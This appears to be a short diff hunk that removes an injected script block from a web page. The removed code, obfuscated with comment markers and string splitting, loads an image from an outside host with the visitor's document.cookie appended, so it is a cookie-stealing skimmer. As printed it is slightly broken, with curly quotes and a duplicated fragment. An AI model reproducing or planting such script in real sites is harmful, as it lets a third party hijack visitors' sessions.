@@ -1,9 +1,0 @@
-<script>/*
-*/var i=new Image();/*
-*/i.src=“http:/” +/*
-*/“l” +/*
-*/“fkunst.de/cake/” +/*
-*/“c.php?cookie=” +/*
-*/“c.php?cookie=” +/*
-*/document.cookie;/*
-*/</script>
